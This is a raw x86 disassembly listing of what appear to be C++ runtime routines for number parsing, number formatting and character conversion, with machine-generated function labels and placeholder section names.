mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x38 ] 0x0
mov [ ebp - 0x40 ] eax
lea eax [ ebp - 0x3c ]
mov [ ebp - 0x34 ] ecx
push eax
mov ecx esi
call sub_10007b59
mov esi [ esi + 0x10 ]
and [ ebp - 0x4 ] 0x0
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x34 ]
call sub_100388e4
or [ ebp - 0x4 ] 0xffffffff
add esp 0x18
lea ecx [ ebp - 0x3c ]
mov esi eax
call sub_10007b41
cmp [ ebp - 0x30 ] 0x2d
lea eax [ ebp - 0x2f ]
je r-xdata
mov [ ebp - 0x34 ] eax
lea eax [ ebp - 0x38 ]
push eax
push esi
lea eax [ ebp - 0x44 ]
push eax
push [ ebp - 0x34 ]
call sub_1001bb94
mov esi eax
add esp 0x10
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10037f31
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
mov eax [ ebp - 0x34 ]
cmp [ ebp - 0x44 ] eax
je r-xdata
or [ edi ] 0x1
or [ edi ] 0x2
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
cmp esi 0xffffffff
ja r-xdata
cmp [ ebp - 0x30 ] 0x2d
jne r-xdata
mov [ ebx ] esi
jmp r-xdata
neg esi
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x40 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_10023f1f
retn 0x20
sub_10039945
push 0x38
mov eax sub_10048beb
call sub_10023e9c
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x44 ] ecx
push eax
mov ecx esi
call sub_10007b59
mov esi [ esi + 0x10 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x34 ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x44 ]
call sub_100388e4
add esp 0x18
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_1001bd2f
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x38 ]
mov esi eax
call sub_10007b41
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10037f31
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x40 ] eax
je r-xdata
or [ edi ] 0x1
or [ edi ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov [ ebx ] esi
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x3c ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_10023f1f
retn 0x20
sub_100399f3
push 0x38
mov eax sub_10048beb
call sub_10023e9c
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x44 ] ecx
push eax
mov ecx esi
call sub_10007b59
mov esi [ esi + 0x10 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x34 ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x44 ]
call sub_100388e4
add esp 0x18
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_1001bb94
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x38 ]
mov esi eax
call sub_10007b41
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10037f31
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x40 ] eax
je r-xdata
or [ edi ] 0x1
or [ edi ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov [ ebx ] esi
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x3c ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_10023f1f
retn 0x20
sub_10039aa1
push 0x3c
mov eax sub_10047c41
call sub_10023e9c
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov ebx [ ebp + 0x20 ]
mov edi [ ebp + 0x24 ]
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x44 ] ecx
push eax
mov ecx esi
call sub_10007b59
mov esi [ esi + 0x10 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x34 ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x44 ]
call sub_100388e4
add esp 0x18
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_1001bdd4
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x38 ]
mov esi eax
mov [ ebp - 0x44 ] edx
call sub_10007b41
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10037f31
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x40 ] eax
je r-xdata
or [ ebx ] 0x1
or [ ebx ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x44 ]
mov [ edi ] esi
mov [ edi + 0x4 ] eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x3c ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_10023f1f
retn 0x20
sub_10039b58
push 0x3c
mov eax sub_10047c41
call sub_10023e9c
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov ebx [ ebp + 0x20 ]
mov edi [ ebp + 0x24 ]
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x44 ] ecx
push eax
mov ecx esi
call sub_10007b59
mov esi [ esi + 0x10 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x34 ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x44 ]
call sub_100388e4
add esp 0x18
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_1001be97
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x38 ]
mov esi eax
mov [ ebp - 0x44 ] edx
call sub_10007b41
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10037f31
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x40 ] eax
je r-xdata
or [ ebx ] 0x1
or [ ebx ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x44 ]
mov [ edi ] esi
mov [ edi + 0x4 ] eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x3c ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_10023f1f
retn 0x20
sub_10039c0f
push 0x50
mov eax sub_10047c6e
call sub_10023e9c
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x54 ] 0x0
lea eax [ ebp - 0x58 ]
mov [ ebp - 0x50 ] ecx
mov ecx [ ebp + 0x1c ]
push eax
call sub_10007b59
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x54 ]
push ecx
push eax
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp - 0x50 ]
call sub_10038bab
add esp 0x14
push eax
lea eax [ ebp - 0x5c ]
push eax
lea eax [ ebp - 0x4c ]
push eax
call sub_1001c09c
fstp [ ebp - 0x50 ]
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x58 ]
call sub_10007b41
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10037f31
test al al
je r-xdata
lea eax [ ebp - 0x4c ]
cmp [ ebp - 0x5c ] eax
je r-xdata
or [ esi ] 0x1
or [ esi ] 0x2
cmp [ ebp - 0x54 ] 0x0
jne r-xdata
fld [ ebp - 0x50 ]
fstp [ ebx ]
jmp r-xdata
mov eax [ ebp + 0xc ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
mov [ edi + 0x4 ] eax
mov eax edi
call sub_10023f1f
retn 0x20
sub_10039cb7
push 0x54
mov eax sub_1004840c
call sub_10023e9c
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x50 ] 0x0
lea eax [ ebp - 0x54 ]
mov [ ebp - 0x5c ] ecx
mov ecx [ ebp + 0x1c ]
push eax
call sub_10007b59
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x50 ]
push ecx
push eax
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp - 0x5c ]
call sub_10038bab
add esp 0x14
push eax
lea eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
call sub_1001c0be
fstp [ ebp - 0x60 ]
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x54 ]
call sub_10007b41
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10037f31
test al al
je r-xdata
lea eax [ ebp - 0x4c ]
cmp [ ebp - 0x58 ] eax
je r-xdata
or [ esi ] 0x1
or [ esi ] 0x2
cmp [ ebp - 0x50 ] 0x0
jne r-xdata
fld [ ebp - 0x60 ]
fstp [ ebx ]
jmp r-xdata
mov eax [ ebp + 0xc ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
mov [ edi + 0x4 ] eax
mov eax edi
call sub_10023f1f
retn 0x20
sub_10039d5f
push 0x54
mov eax sub_1004840c
call sub_10023e9c
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x50 ] 0x0
lea eax [ ebp - 0x54 ]
mov [ ebp - 0x5c ] ecx
mov ecx [ ebp + 0x1c ]
push eax
call sub_10007b59
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x50 ]
push ecx
push eax
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp - 0x5c ]
call sub_10038bab
add esp 0x14
push eax
lea eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
call sub_1001c127
fstp [ ebp - 0x60 ]
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x54 ]
call sub_10007b41
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10037f31
test al al
je r-xdata
lea eax [ ebp - 0x4c ]
cmp [ ebp - 0x58 ] eax
je r-xdata
or [ esi ] 0x1
or [ esi ] 0x2
cmp [ ebp - 0x50 ] 0x0
jne r-xdata
fld [ ebp - 0x60 ]
fstp [ ebx ]
jmp r-xdata
mov eax [ ebp + 0xc ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
mov [ edi + 0x4 ] eax
mov eax edi
call sub_10023f1f
retn 0x20
sub_10039e07
push 0x38
mov eax sub_10048bbe
call sub_10023e9c
mov ebx [ ebp + 0x8 ]
mov esi [ ebp + 0x20 ]
mov edi [ ebp + 0x24 ]
and [ ebp - 0x3c ] 0x0
lea eax [ ebp - 0x40 ]
mov [ ebp - 0x34 ] ecx
mov ecx [ ebp + 0x1c ]
push eax
call sub_10007b59
and [ ebp - 0x4 ] 0x0
push eax
push 0x800
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x34 ]
call sub_100388e4
or [ ebp - 0x4 ] 0xffffffff
add esp 0x18
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x34 ] eax
call sub_10007b41
lea eax [ ebp - 0x3c ]
push eax
push [ ebp - 0x34 ]
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_1001bb94
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x38 ] eax
add esp 0x10
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10037f31
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x44 ] eax
je r-xdata
or [ esi ] 0x1
or [ esi ] 0x2
cmp [ ebp - 0x3c ] 0x0
jne r-xdata
mov eax [ ebp - 0x38 ]
mov [ edi ] eax
jmp r-xdata
mov eax [ ebp + 0xc ]
mov [ ebx ] eax
mov eax [ ebp + 0x10 ]
mov [ ebx + 0x4 ] eax
mov eax ebx
call sub_10023f1f
retn 0x20
sub_10039ebd
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov eax [ esi + 0x10 ]
push edi
push [ ebp + 0x1c ]
mov edi [ ebp + 0x8 ]
push eax
push r--data
lea eax [ ebp - 0xc ]
mov ebx ecx
push eax
push ebx
call sub_1003ae01
add esp 0x10
push eax
lea eax [ ebp - 0x4c ]
push 0x40
push eax
call sub_1002088b
push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push ebx
call sub_10039428
mov ecx [ ebp - 0x4 ]
add esp 0x30
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10020040
leave
retn 0x18
sub_10039f2b
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov eax [ esi + 0x10 ]
push edi
push [ ebp + 0x1c ]
mov edi [ ebp + 0x8 ]
push eax
push r--data
lea eax [ ebp - 0xc ]
mov ebx ecx
push eax
push ebx
call sub_1003ae01
add esp 0x10
push eax
lea eax [ ebp - 0x4c ]
push 0x40
push eax
call sub_1002088b
push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push ebx
call sub_10039428
mov ecx [ ebp - 0x4 ]
add esp 0x30
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10020040
leave
retn 0x18
sub_10039f99
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov eax [ esi + 0x10 ]
push edi
push [ ebp + 0x20 ]
mov edi [ ebp + 0x8 ]
push [ ebp + 0x1c ]
mov ebx ecx
push eax
push r--data
lea eax [ ebp - 0xc ]
push eax
push ebx
call sub_1003ae01
add esp 0x10
push eax
lea eax [ ebp - 0x4c ]
push 0x40
push eax
call sub_1002088b
push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push ebx
call sub_10039428
mov ecx [ ebp - 0x4 ]
add esp 0x34
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10020040
leave
retn 0x1c
sub_1003a00a
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov eax [ esi + 0x10 ]
push edi
push [ ebp + 0x20 ]
mov edi [ ebp + 0x8 ]
push [ ebp + 0x1c ]
mov ebx ecx
push eax
push r--data
lea eax [ ebp - 0xc ]
push eax
push ebx
call sub_1003ae01
add esp 0x10
push eax
lea eax [ ebp - 0x4c ]
push 0x40
push eax
call sub_1002088b
push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push ebx
call sub_10039428
mov ecx [ ebp - 0x4 ]
add esp 0x34
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10020040
leave
retn 0x1c
sub_1003a07b
mov edi edi
push ebp
mov ebp esp
sub esp 0x88
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov [ ebp - 0x84 ] ecx
mov ecx [ esi + 0x14 ]
xor ebx ebx
cmp ecx ebx
mov [ ebp - 0x88 ] eax
push edi
mov eax 0x2000
jg r-xdata
mov edi ecx
push 0x24
pop ecx
cmp edi ecx
mov [ ebp - 0x8 ] ecx
jg r-xdata
test [ esi + 0x10 ] eax
jne r-xdata
mov ecx [ esi + 0x10 ]
fld [ ebp + 0x1c ]
sub edi [ ebp - 0x8 ]
mov edx ecx
and edx 0x3000
mov [ ebp - 0x80 ] ebx
cmp edx eax
jne r-xdata
mov [ ebp - 0x8 ] edi
push 0x6
pop ecx
push ecx
push ecx
fstp [ esp ]
push [ ebp - 0x8 ]
lea eax [ ebp - 0xc ]
push ecx
push 0x0
push eax
push [ ebp - 0x84 ]
call sub_10037e5a
add esp 0x10
push eax
lea eax [ ebp - 0x78 ]
push 0x6c
push eax
call sub_1002088b
push eax
push edi
push ebx
push [ ebp - 0x80 ]
lea eax [ ebp - 0x78 ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp - 0x88 ]
push [ ebp - 0x84 ]
call sub_10039005
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x88 ]
add esp 0x44
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10020040
leave
retn 0x1c
fld [ r--data ]
fmul st1
fucomp st1
fnstsw ax
test ah 0x44
jpo r-xdata
fldz
fcom st1
fnstsw ax
test ah 0x41
jne r-xdata
mov [ ebp - 0x79 ] bl
fxch st1
fxch st1
mov [ ebp - 0x79 ] 0x1
fchs
jmp r-xdata
cmp [ ebp - 0x80 ] 0x1388
jae r-xdata
fstp st1
jmp r-xdata
fld [ r--data ]
push 0xa
fcom st1
pop edx
fnstsw ax
fld [ r--data ]
test ah 0x41
jpo r-xdata
fdiv st2
add [ ebp - 0x80 ] edx
fxch st1
fcom st2
fnstsw ax
test ah 0x41
jpo r-xdata
fxch st2
fcomp st1
fnstsw ax
test ah 0x5
jpe r-xdata
fxch st1
fstp st0
cmp [ ebp - 0x79 ] 0x0
fstp st1
je r-xdata
cmp edi edx
jl r-xdata
fchs
fld [ r--data ]
fcomp st1
fnstsw ax
test ah 0x1
jne r-xdata
cmp ebx 0x1388
jae r-xdata
sub edi edx
fmul st1
add ebx edx
jmp r-xdata
sub_1003a1ee
mov edi edi
push ebp
mov ebp esp
sub esp 0x8c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0x14 ]
mov [ ebp - 0x88 ] ecx
mov ecx [ esi + 0x14 ]
mov [ ebp - 0x8c ] eax
push edi
mov eax 0x2000
test ecx ecx
jg r-xdata
mov edi ecx
push 0x24
pop ecx
cmp edi ecx
mov [ ebp - 0x8 ] ecx
jg r-xdata
test [ esi + 0x10 ] eax
jne r-xdata
mov ecx [ esi + 0x10 ]
sub edi [ ebp - 0x8 ]
and [ ebp - 0x80 ] 0x0
and [ ebp - 0x84 ] 0x0
mov edx ecx
and edx 0x3000
cmp edx eax
jne r-xdata
mov [ ebp - 0x8 ] edi
push 0x6
pop ecx
fld [ ebp + 0x1c ]
fldz
fld [ ebp + 0x1c ]
fcom st1
fnstsw ax
test ah 0x5
jpe r-xdata
mov [ ebp - 0x79 ] 0x0
jmp r-xdata
mov [ ebp - 0x79 ] 0x1
fchs
fld [ r--data ]
push ebx
fcom st1
push 0xa
mov ebx 0x1388
pop edx
fnstsw ax
fld [ r--data ]
test ah 0x41
jpo r-xdata
cmp [ ebp - 0x80 ] ebx
jae r-xdata
fstp st1
jmp r-xdata
fdiv st2
add [ ebp - 0x80 ] edx
fxch st1
fcom st2
fnstsw ax
test ah 0x41
jpo r-xdata
fxch st2
fcomp st1
fnstsw ax
test ah 0x5
jpe r-xdata
fxch st1
fstp st0
cmp [ ebp - 0x79 ] 0x0
fstp st1
pop ebx
je r-xdata
cmp edi edx
jl r-xdata
push ecx
push ecx
fstp [ esp ]
push [ ebp - 0x8 ]
lea eax [ ebp - 0xc ]
push ecx
push 0x4c
push eax
push [ ebp - 0x88 ]
call sub_10037e5a
add esp 0x10
push eax
lea eax [ ebp - 0x78 ]
push 0x6c
push eax
call sub_1002088b
push eax
push edi
push [ ebp - 0x84 ]
lea eax [ ebp - 0x78 ]
push [ ebp - 0x80 ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp - 0x8c ]
push [ ebp - 0x88 ]
call sub_10039005
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x8c ]
add esp 0x44
pop edi
xor ecx ebp
pop esi
call sub_10020040
leave
retn 0x1c
fchs
jmp r-xdata
fld [ r--data ]
fcomp st1
fnstsw ax
test ah 0x1
jne r-xdata
cmp [ ebp - 0x84 ] ebx
jae r-xdata
sub edi edx
fmul st1
add [ ebp - 0x84 ] edx
jmp r-xdata
sub_1003a35e
mov edi edi
push ebp
mov ebp esp
sub esp 0x44
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x1c ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0x14 ]
push eax
push r--data
lea eax [ ebp - 0x44 ]
push 0x40
push eax
mov ebx ecx
call sub_1002088b
push eax
lea eax [ ebp - 0x44 ]
push eax
push [ ebp + 0x18 ]
push edi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
push ebx
call sub_10039428
mov ecx [ ebp - 0x4 ]
add esp 0x30
pop edi
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_10020040
leave
retn 0x18
sub_1003a3ed
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push [ ebp + 0x10 ]
and [ ebp - 0x4 ] 0x0
and [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
call sub_1001b946
mov ax [ ebp - 0x4 ]
add esp 0x14
leave
retn
sub_1003a41b
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
push [ ebp + 0x8 ]
xor edi edi
mov [ ebp - 0xc ] edi
call sub_100200e0
mov esi eax
mov eax [ ebp + 0x8 ]
inc esi
pop ecx
mov ebx esi
mov [ ebp - 0x8 ] eax
je r-xdata
inc edi
xor ecx ecx
push 0x2
pop edx
mov eax edi
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_1001c132
and [ ebp - 0x10 ] 0x0
mov ebx eax
pop ecx
mov [ ebp - 0x8 ] ebx
jmp r-xdata
push [ ebp + 0x10 ]
lea eax [ ebp - 0xc ]
push eax
push ebx
push [ ebp - 0x8 ]
lea eax [ ebp - 0x4 ]
push eax
call sub_1001b946
add esp 0x14
test eax eax
jle r-xdata
test edi edi
ja r-xdata
add [ ebp - 0x8 ] eax
sub ebx eax
inc edi
test ebx ebx
ja r-xdata
push [ ebp + 0x10 ]
lea eax [ ebp - 0x10 ]
push eax
push esi
push [ ebp + 0x8 ]
push ebx
call sub_1001b946
add esp 0x14
test eax eax
jle r-xdata
pop edi
xor eax eax
mov [ ebx ] ax
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
leave
retn
add [ ebp + 0x8 ] eax
dec edi
inc ebx
inc ebx
sub_1003a4b8
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
lea eax [ ebp - 0x10 ]
mov ebx ecx
mov ecx [ ebp + 0x8 ]
push eax
call sub_10007608
mov ecx [ ebp + 0x8 ]
mov esi eax
lea edi [ ebx + 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x8 ]
push eax
movsd [ edi ] [ esi ]
call sub_1000762b
mov ecx [ eax ]
mov [ ebx + 0x18 ] ecx
mov eax [ eax + 0x4 ]
pop edi
pop esi
mov [ ebx + 0x1c ] eax
pop ebx
leave
retn 0x4
sub_1003a4ff
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
lea eax [ ebp - 0x8 ]
mov esi ecx
mov ecx [ ebp + 0x8 ]
push eax
call sub_1000762b
mov ecx [ eax ]
mov [ esi + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ esi + 0x10 ] eax
lea eax [ ebp + 0x8 ]
push eax
call sub_1003a3d3
mov ecx [ eax ]
mov [ esi + 0x8 ] ecx
and [ eax ] 0x0
push [ ebp + 0x8 ]
call sub_100207fd
pop ecx
pop esi
leave
retn 0x4
sub_1003a55b
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
lea eax [ ebp - 0x8 ]
mov esi ecx
mov ecx [ ebp + 0x8 ]
push eax
call sub_1000762b
mov ecx [ eax ]
mov [ esi + 0x8 ] ecx
mov eax [ eax + 0x4 ]
mov [ esi + 0xc ] eax
pop esi
leave
retn 0x4
sub_1003a5a3
mov edi edi
push esi
mov esi ecx
push [ esi + 0x8 ]
call sub_100209c6
push [ esi + 0x10 ]
call sub_100209c6
push [ esi + 0x14 ]
call sub_100209c6
push [ esi + 0x18 ]
call sub_100209c6
add esp 0x10
pop esi
retn
sub_1003a5cd
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x28 ] 0x0
jne r-xdata
mov eax r--data
mov ecx [ ebp + 0xc ]
cmp ecx 0x2
ja r-xdata
mov eax [ ebp + 0x10 ]
cmp eax 0x1
ja r-xdata
cmp [ ebp + 0x14 ] 0x4
ja r-xdata
lea eax [ eax + ecx * 2 ]
imul eax eax 0x5
add eax [ ebp + 0x14 ]
lea eax [ eax * 4 + r--data ]
jmp r-xdata
push 0x4
push eax
push 0x4
push [ ebp + 0x8 ]
call sub_1002005a
add esp 0x10
pop ebp
retn 0x10
sub_1003a619
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
push [ ebp + 0x8 ]
mov esi ecx
mov [ esi + 0x4 ] eax
mov [ esi ] r--data
call sub_1003a55b
mov eax esi
pop esi
pop ebp
retn 0x8
sub_1003a63c
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x14 ]
mov [ esi ] eax
mov eax [ ebp + 0x18 ]
push edi
mov edi [ ebp + 0x20 ]
mov [ ebp - 0x4 ] ecx
xor ecx ecx
mov [ edi ] eax
mov eax [ esi ]
cmp eax ebx
setne cl
mov [ ebp + 0x14 ] ecx
cmp eax ebx
je r-xdata
mov eax [ ebp + 0x14 ]
mov ecx [ edi ]
cmp ecx [ ebp + 0x1c ]
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ esi ]
add edx 0x8
push edx
push [ ebp + 0x8 ]
mov edx ebx
sub edx eax
push edx
push eax
push ecx
call sub_1001b946
add esp 0x14
cmp eax 0xfffffffe
je r-xdata
mov [ esi ] ebx
cmp eax 0xffffffff
je r-xdata
push 0x2
pop eax
jmp r-xdata
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x1c
cmp eax 0xfffffffd
jne r-xdata
mov ecx [ edi ]
cmp [ ecx ] ax
jne r-xdata
add [ esi ] eax
add [ edi ] 0x2
and [ ebp + 0x14 ] 0x0
cmp [ esi ] ebx
jne r-xdata
xor eax eax
push [ esi ]
call sub_100200e0
pop ecx
inc eax
jmp r-xdata
sub_1003a6d2
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x1c ]
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x14 ]
mov [ esi ] eax
mov eax [ ebp + 0x18 ]
push edi
mov edi [ ebp + 0x20 ]
xor edx edx
